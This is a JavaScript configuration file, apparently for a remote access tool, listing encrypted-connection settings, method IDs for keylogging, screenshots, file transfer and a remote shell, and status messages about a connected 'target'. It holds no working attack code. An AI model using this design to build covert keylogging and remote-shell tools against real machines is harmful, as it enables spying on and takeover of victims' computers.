/**
 * Config file
 */
export default {
  connection: {
    ALIVE_PERIOD: 10000,
    MAX_RETRY_TIMES: 3,
    MAX_SEQUENCE_NUMBER: 65536,
    RESPONSE_TIMEOUT: 30000
  },
  transfer: {
    CIPHER_ALGORITHM: 'AES-256-CBC'
  },
  methodID: {
    disconnect: 1,
    keyLogger: 2,
    screenShot: 3,
    transFile: 4,
    getFilePreview: 5,
    shell: 6,
    sendCommand: 7
  },
  statusCodes: {
    '201': 'Shell connected',
    '202': 'Transmission success',
    '203': 'keyLogger updated',
    '300': 'file dose not exist',
    '401': 'target disconnect',
    '402': 'shell disconnect'
  }
}
